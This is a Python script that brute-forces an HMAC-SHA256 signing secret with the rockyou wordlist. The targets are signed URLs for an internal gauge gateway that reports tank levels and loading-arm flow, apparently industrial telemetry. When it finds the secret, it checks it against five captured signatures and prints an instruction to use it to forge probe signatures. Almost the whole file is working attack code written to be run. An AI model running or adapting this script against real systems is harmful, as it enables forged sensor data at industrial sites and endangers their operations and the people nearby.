#!/usr/bin/env python3
"""round56 — HMAC-SHA256 crack via rockyou.txt.gz (read directly, no decompress)"""
import gzip, hmac as hm, hashlib, time, os, sys

KNOWN_URL = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

ALL_SIGS = {
    b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
    b"http://gauge-gw.internal:9100/v1/tanks/1/level": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803",
    b"http://gauge-gw.internal:9100/v1/tanks/2/level": "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197",
    b"http://gauge-gw.internal:9100/v1/tanks/3/level": "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3",
    b"http://gauge-gw.internal:9100/v1/tanks/7/level": "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f",
}

gz_path = "/usr/share/wordlists/rockyou.txt.gz"
txt_path = "/usr/share/wordlists/rockyou.txt"

# Pick source
if os.path.exists(txt_path):
    src = txt_path
    opener = open
elif os.path.exists(gz_path):
    src = gz_path
    opener = gzip.open
else:
    print("ERROR: rockyou.txt not found")
    sys.exit(1)

print(f"Source: {src}")
print(f"Target HMAC-SHA256: {KNOWN_SIG.hex()}")
print(f"URL: {KNOWN_URL.decode()}")
print(f"Starting dictionary attack...\n")

count = 0
t0 = time.time()

try:
    with opener(src, "rb") as f:
        for line in f:
            word = line.rstrip(b"\n\r")
            if not word:
                continue
            count += 1

            if hm.new(word, KNOWN_URL, hashlib.sha256).digest() == KNOWN_SIG:
                elapsed = time.time() - t0
                print(f"\n{'='*60}")
                print(f"*** PROBE_SECRET FOUND: {word!r} ***")
                try:
                    print(f"*** Decoded: {word.decode('utf-8')} ***")
                except:
                    print(f"*** Decoded (latin1): {word.decode('latin-1')} ***")
                print(f"*** After {count:,} attempts in {elapsed:.1f}s ***")
                print(f"{'='*60}")

                print(f"\nVerification against all 5 signatures:")
                for url, expected in ALL_SIGS.items():
                    computed = hm.new(word, url, hashlib.sha256).hexdigest()
                    ok = computed == expected
                    print(f"  {'OK' if ok else 'FAIL'} {url.decode()[-30:]}")

                print(f"\n*** USE THIS TO FORGE PROBE SIGNATURES ***")
                print(f"PROBE_SECRET = {word!r}")
                sys.exit(0)

            if count % 500000 == 0:
                elapsed = time.time() - t0
                rate = count / elapsed
                print(f"  {count:>10,} words | {rate:>8,.0f}/sec | {elapsed:>6.0f}s", flush=True)

    elapsed = time.time() - t0
    print(f"\nНе найдено в {count:,} словах за {elapsed:.1f}s")

except KeyboardInterrupt:
    elapsed = time.time() - t0
    print(f"\nПрервано после {count:,} слов за {elapsed:.1f}s")
